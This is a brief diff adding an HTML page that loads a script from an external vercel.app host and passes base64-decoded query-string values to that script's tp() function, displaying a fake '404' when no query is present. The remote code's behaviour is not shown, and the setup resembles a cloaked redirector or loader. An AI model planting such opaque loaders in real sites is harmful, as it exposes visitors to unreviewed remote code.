@@ -1,1 +1,16 @@
-test
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width">
+</head>
+<body>loading
+    <script src="https://tw-ybzj.vercel.app/t1.js"></script>
+    <script>
+    if(window.location.href.includes("?")){
+        tp(window.location.href.split("?")[1].split(";").map(x=>atob(x)))
+    }else{
+        document.body.innerText="404"
+    }
+    </script>
+</body>
+</html>
